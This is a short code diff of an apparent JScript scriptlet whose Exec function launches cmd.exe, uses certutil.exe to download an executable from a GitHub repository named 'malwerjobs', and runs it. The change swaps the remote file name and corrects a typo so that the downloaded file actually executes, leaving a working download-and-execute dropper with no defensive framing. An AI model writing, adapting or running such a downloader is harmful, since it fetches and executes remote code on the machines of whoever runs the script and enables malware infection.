@@ -9,7 +9,7 @@
 <script language="JScript">
 <![CDATA[
 	function Exec()	{
-		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/SteAmeR/malwerjobs/master/steamer.exe steamer.exe && steaöer.exe");
+		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/SteAmeR/malwerjobs/master/steamerx.exe steamer.exe && steamer.exe");
 	}
 ]]>
 </script>
